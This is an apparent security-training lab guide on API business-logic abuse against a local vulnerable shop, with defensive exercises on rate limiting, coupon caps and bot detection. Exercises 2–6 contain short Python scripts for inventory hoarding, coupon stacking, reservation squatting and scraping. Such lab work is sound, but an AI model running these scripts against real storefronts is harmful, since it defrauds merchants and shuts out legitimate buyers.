# API06: Business Logic Abuse Lab - Instructions

## Lab Setup

1. Start the lab:
```bash
docker-compose up -d
```

2. Access the application:
   - Web UI: http://localhost:5006
   - API: http://localhost:5006/api/

## Exercises

### Exercise 1: Reconnaissance - Understanding Business Flows

**Objective**: Map out the business-critical endpoints.

**Steps**:
1. Browse the web interface and identify available products
2. Test the purchase flow manually
3. Examine the API requests in browser DevTools
4. Document all API endpoints and their parameters

**Questions**:
- Which endpoints handle sensitive business operations?
- What parameters control pricing and quantity?
- Are there any rate limits visible?

### Exercise 2: Automated Bulk Purchasing

**Objective**: Demonstrate how bots can purchase limited inventory instantly.

**Steps**:
1. Note the initial stock of Limited Edition Sneakers (50 units)
2. Create a simple script to purchase all units
3. Execute the script and observe the results

**Script**:
```python
import requests

for i in range(50):
    requests.post('http://localhost:5006/api/purchase', json={
        'user_id': 1,
        'product_id': 1,
        'quantity': 1
    })
    print(f"Purchased unit {i+1}")
```

**Analysis**:
- How long did it take to buy all inventory?
- Could a legitimate user compete with this bot?
- What protections are missing?

### Exercise 3: Coupon Stacking Abuse

**Objective**: Exploit unlimited coupon application.

**Steps**:
1. Test applying a single coupon (SAVE10)
2. Test applying multiple coupons on one purchase
3. Apply all available coupons to maximize discount

**Attack**:
```python
import requests

response = requests.post('http://localhost:5006/api/purchase', json={
    'user_id': 1,
    'product_id': 2,  # Exclusive Watch ($599.99)
    'quantity': 1,
    'coupons': ['SAVE10', 'SAVE20', 'VIP30', 'FLASH50']
})

print(response.json())
```

**Analysis**:
- What was the original price vs. final price?
- What discount percentage was achieved?
- Is this behavior intended?

### Exercise 4: Inventory Reservation Squatting

**Objective**: Reserve all inventory without purchasing.

**Steps**:
1. Use the Reserve button to reserve products
2. Create a script to reserve all limited edition items
3. Observe the impact on availability

**Script**:
```python
import requests

# Reserve all Designer Bags
for i in range(30):
    requests.post('http://localhost:5006/api/cart/reserve', json={
        'user_id': i,
        'product_id': 3,
        'quantity': 1
    })

print("All inventory reserved")
```

**Analysis**:
- Can other users still purchase?
- How long do reservations last?
- What's the business impact?

### Exercise 5: Price Scraping at Scale

**Objective**: Extract complete product catalog for competitive intelligence.

**Steps**:
1. Make repeated requests to /api/products
2. Monitor for rate limiting or blocking
3. Extract all product data including prices and stock levels

**Script**:
```python
import requests
import time

for i in range(100):
    r = requests.get('http://localhost:5006/api/products')
    products = r.json()
    print(f"Request {i+1}: {len(products)} products, Status: {r.status_code}")
    time.sleep(0.1)
```

**Analysis**:
- Were you blocked or rate limited?
- What data could a competitor gather?
- How often could you scrape?

### Exercise 6: Analyzing Attack Timing

**Objective**: Understand the speed advantage of bots.

**Steps**:
1. Manually purchase a product and time the process
2. Use a script to purchase the same product
3. Compare the times

**Manual Process**:
- Click product → Add to cart → Enter coupon → Checkout
- Estimated time: 15-30 seconds

**Automated Process**:
```python
import requests
import time

start = time.time()
requests.post('http://localhost:5006/api/purchase', json={
    'user_id': 1,
    'product_id': 1,
    'quantity': 1,
    'coupons': ['SAVE10']
})
elapsed = time.time() - start
print(f"Completed in {elapsed:.3f} seconds")
```

**Analysis**:
- Bot time vs. human time?
- In a flash sale, who wins?

### Exercise 7: Implementing Basic Defenses

**Objective**: Add rate limiting to protect the purchase endpoint.

**Steps**:
1. Modify server.py to add rate limiting
2. Test that the limit works
3. Attempt to bypass with multiple user IDs

**Code to Add**:
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["100 per hour"]
)

@app.route('/api/purchase', methods=['POST'])
@limiter.limit("5 per minute")
def purchase():
    # existing code
```

**Test**:
```python
# Try 10 rapid purchases
for i in range(10):
    r = requests.post('http://localhost:5006/api/purchase', json={
        'user_id': 1,
        'product_id': 1,
        'quantity': 1
    })
    print(f"{i+1}: {r.status_code}")
```

### Exercise 8: Implementing Coupon Limits

**Objective**: Prevent coupon stacking abuse.

**Steps**:
1. Modify the purchase endpoint to limit coupons to 1 per transaction
2. Add a maximum discount percentage cap (e.g., 50%)
3. Test that multiple coupons are rejected

**Implementation**:
```python
# In purchase() function
if len(coupons) > 1:
    return jsonify({'error': 'Only one coupon allowed per transaction'}), 400

# After calculating total with coupon
max_discount = original_price * 0.5
if total < max_discount:
    total = max_discount
```

### Exercise 9: Behavioral Analysis

**Objective**: Detect bot-like behavior patterns.

**Steps**:
1. Track time between product view and purchase
2. Reject purchases that happen too quickly (< 5 seconds)
3. Implement session tracking

**Concept**:
```python
from datetime import datetime

# Track session activity
session_data = {}

@app.route('/api/products', methods=['GET'])
def get_products():
    session_id = request.headers.get('X-Session-ID')
    session_data[session_id] = {'viewed_at': datetime.now()}
    # return products

@app.route('/api/purchase', methods=['POST'])
def purchase():
    session_id = request.headers.get('X-Session-ID')
    if session_id in session_data:
        time_gap = (datetime.now() - session_data[session_id]['viewed_at']).total_seconds()
        if time_gap < 5:
            return jsonify({'error': 'Purchase too fast, suspected bot'}), 429
    # process purchase
```

### Exercise 10: Complete Protection Implementation

**Objective**: Implement comprehensive bot protection.

**Requirements**:
1. Multi-dimensional rate limiting (user, IP, device)
2. Coupon usage limits
3. Reservation time limits (15 minutes)
4. Behavioral analysis
5. Risk scoring

**Test Your Implementation**:
- Run all previous attack scripts
- Verify they are blocked or challenged
- Confirm legitimate users can still purchase
- Monitor false positives

## Attack Scripts

See `attacks/` directory for ready-to-use attack scripts:
- `bulk_purchase.py` - Buy entire inventory
- `coupon_abuse.py` - Stack all coupons
- `reservation_dos.py` - Reserve all products
- `price_scraper.py` - Extract catalog data
- `flash_sale_bot.py` - Instant purchase on sale start

## Success Criteria

You've successfully completed this lab when you can:

1. ✅ Explain how bots abuse business flows
2. ✅ Demonstrate automated attacks
3. ✅ Identify vulnerable endpoints
4. ✅ Implement rate limiting
5. ✅ Add behavioral analysis
6. ✅ Test and verify protections
7. ✅ Balance security with user experience

## Further Exploration

- Implement device fingerprinting
- Add CAPTCHA for high-risk transactions
- Create a monitoring dashboard
- Implement machine learning for anomaly detection
- Test evasion techniques (IP rotation, timing variation)

## Resources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- Flask-Limiter documentation
- Redis rate limiting patterns
- Bot detection best practices
